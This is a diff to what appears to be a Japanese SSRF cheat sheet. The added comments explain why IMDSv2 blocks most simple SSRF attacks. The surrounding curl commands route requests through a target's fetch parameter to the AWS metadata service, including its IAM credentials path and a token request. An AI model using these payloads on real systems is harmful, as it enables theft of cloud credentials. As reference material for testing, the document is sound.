@@ -58,6 +58,9 @@ curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/meta-data/iam/secu
 
 # AWS EC2 (IMDSv2): セッショントークンが必要・ヘッダ注入できないアプリ構造だと成立しない
 # 1) PUT で token 取得 → 2) GET にヘッダで添える、の 2 段
+# 大半の SSRF は GET 固定 + 任意ヘッダ送信不可なため、IMDSv2 を通すには PUT メソッド指定 + 任意ヘッダ送信のいずれも
+# アプリ経由で可能な経路（HTTP リクエストスマグリング / CRLF injection / SSRF プロキシ機能のヘッダ転送）が必要。
+# 「URL を入れると fetch する」だけの単純 SSRF では刺さらないのが大半で、IMDSv2 強制環境では SSRF の難易度が一段上がる。
 curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/api/token" \
   -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -X PUT
 # → token 取得後に X-aws-ec2-metadata-token ヘッダを付けて GET（アプリ側がヘッダ送信を許可する設計の場合のみ）
